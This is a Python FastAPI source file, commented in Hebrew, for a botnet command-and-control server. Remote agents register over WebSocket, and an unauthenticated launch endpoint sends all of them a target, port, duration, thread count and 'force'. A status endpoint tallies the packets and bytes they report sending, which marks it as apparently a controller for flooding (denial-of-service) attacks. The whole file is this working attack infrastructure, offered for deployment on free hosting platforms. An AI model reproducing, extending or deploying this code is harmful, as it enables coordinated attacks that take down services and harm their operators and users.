# ============================================================
#  C2 SERVER — WebSocket, תואם Back4app / Railway / Render
#  משתמש ב-PORT מהסביבה אם קיים
# ============================================================

import asyncio
import json
import os
import uuid
import sys
from datetime import datetime, timezone

from fastapi import FastAPI, WebSocket, WebSocketDisconnect
from pydantic import BaseModel
import uvicorn

app = FastAPI()

agents: dict = {}


class LaunchPayload(BaseModel):
    target: str
    port: int = 0
    duration: int = 30
    threads: int = 20
    force: int = 1024


@app.websocket("/ws/{agent_id}")
async def ws_endpoint(ws: WebSocket, agent_id: str):
    await ws.accept()
    try:
        raw = await ws.receive_text()
        msg = json.loads(raw)
        if msg.get("type") != "register":
            await ws.close()
            return

        agents[agent_id] = {
            "ws": ws,
            "hostname": msg.get("hostname", "?"),
            "capabilities": msg.get("capabilities", {}),
            "status": "idle",
            "sent_bytes": 0,
            "sent_packets": 0,
            "connected_at": datetime.now(timezone.utc).isoformat(),
        }
        print(f"[C2] ✅ סוכן התחבר: {agent_id[:8]} ({msg.get('hostname')}) | סה\"כ: {len(agents)}", flush=True)

        async for raw in ws.iter_text():
            try:
                m = json.loads(raw)
            except Exception:
                continue
            mtype = m.get("type")

            if mtype == "heartbeat":
                if agent_id in agents:
                    agents[agent_id]["sent_bytes"] = m.get("sent_bytes", 0)
                    agents[agent_id]["sent_packets"] = m.get("sent_packets", 0)
                    agents[agent_id]["status"] = "busy"

            elif mtype == "result":
                if agent_id in agents:
                    agents[agent_id]["status"] = "idle"
                    agents[agent_id]["sent_bytes"] = m.get("sent_bytes", 0)
                    agents[agent_id]["sent_packets"] = m.get("sent_packets", 0)
                print(f"[C2] 📊 {agent_id[:8]}: {m.get('sent_packets',0):,} pkt | "
                      f"{m.get('sent_bytes',0)/1e6:.1f} MB | {m.get('elapsed',0):.1f}s", flush=True)

    except WebSocketDisconnect:
        pass
    except Exception as e:
        print(f"[C2] שגיאה ({agent_id[:8]}): {e}", flush=True)
    finally:
        agents.pop(agent_id, None)
        print(f"[C2] ❌ ניתוק: {agent_id[:8]} | סה\"כ: {len(agents)}", flush=True)


@app.post("/api/launch")
async def launch(p: LaunchPayload):
    task = {
        "task_id": uuid.uuid4().hex[:12],
        "target": p.target,
        "port": p.port,
        "duration": p.duration,
        "threads": p.threads,
        "force": p.force,
    }
    print(f"[C2] 🚀 משימה → {p.target}:{p.port or 'rand'} "
          f"({p.duration}s | x{p.threads}) | {len(agents)} סוכנים", flush=True)

    dead = []
    for aid, a in list(agents.items()):
        try:
            await a["ws"].send_json({"type": "task", **task})
        except Exception:
            dead.append(aid)

    for aid in dead:
        agents.pop(aid, None)

    return {"task_id": task["task_id"], "agents_total": len(agents)}


@app.get("/api/status")
async def status():
    total_bytes = sum(a["sent_bytes"] for a in agents.values())
    total_packets = sum(a["sent_packets"] for a in agents.values())
    return {
        "agents_online": len(agents),
        "total_bytes": total_bytes,
        "total_packets": total_packets,
        "agents": [
            {
                "id": aid[:8],
                "hostname": a["hostname"],
                "status": a["status"],
                "sent_mb": round(a["sent_bytes"] / 1e6, 1),
                "packets": a["sent_packets"],
            }
            for aid, a in list(agents.items())[:30]
        ],
    }


@app.get("/")
async def root():
    return {"ok": True, "agents": len(agents)}


if __name__ == "__main__":
    host = "0.0.0.0"
    port = int(os.getenv("PORT", 8000))
    print(f"[C2] מתחיל על http://{host}:{port}", flush=True)
    uvicorn.run(app, host=host, port=port, log_level="warning")